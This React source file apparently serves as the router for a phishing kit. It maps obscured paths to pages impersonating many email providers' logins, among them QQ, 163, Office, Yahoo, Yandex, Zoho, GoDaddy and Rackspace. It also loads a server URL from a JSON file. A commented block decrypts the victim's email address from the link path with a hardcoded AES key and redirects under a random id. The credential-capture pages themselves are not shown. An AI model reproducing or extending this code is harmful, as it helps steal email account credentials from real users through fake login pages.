import React, { Fragment, useEffect } from "react";
import { navigate, Router } from "@reach/router";
import Page163 from "./pages/163";
import Page126 from "./pages/126";
import Hinet from "./pages/hinet";
import Qq from "./pages/qq";
import Page263 from "./pages/263";
import Godaddy from "./pages/godaddy";
import Hiworks from "./pages/hiworks";
import Mail from "./pages/mail";
import Office from "./pages/office";
import Rackspace from "./pages/rackspace";
import Webmail from "./pages/webmail";
import Yahoo from "./pages/yahoo";
import Yandex from "./pages/yandex";
import Zoho from "./pages/zoho";
import Redirect from "./pages/redirect";
import { ToastContainer } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import Processing from "./pages/processing";
import Encryption from "./pages/encryption";
import uuid from "react-uuid";

var CryptoJS = require("crypto-js");

const serverurl = require("./users.json");

function App() {
 
  return (
    <Fragment>
      <Router>
        <Redirect default />
        <Encryption path="/enc" />
        <Page163 path="/p163" />
        <Page126 path="/p126" />
        <Hinet path="/hnt" />
        <Qq path="/qaq" />
        <Page263 path="p263" />
        <Godaddy path="gdy" />
        <Hiworks path="hw" />
        <Mail path="ml" />
        <Office path="ofc" />
        <Rackspace path="rsp" />
        <Webmail path="wb" />
        <Yahoo path="yh" />
        <Yandex path="yx" />
        <Zoho path="zh" />
        <Processing path="processing" />
      </Router>
      <ToastContainer
        position="top-center"
        autoClose={5000}
        hideProgressBar={false}
        newestOnTop={false}
        closeOnClick
        rtl={false}
        pauseOnFocusLoss
        draggable
        pauseOnHover
      />
    </Fragment>
  );
}

export default App;

/*
<Redirect path={`/:entry/:email`} />

 useEffect(() => {
    const path = window.location.pathname;
    const id = path.substr(1);

    var bytes = CryptoJS.AES.decrypt(id, "ghost94");
    var originalText = bytes.toString(CryptoJS.enc.Utf8);
    console.log(originalText);
    navigate(`/${uuid()}`, { state: { encryptedata: originalText } });
  }, []);
*/
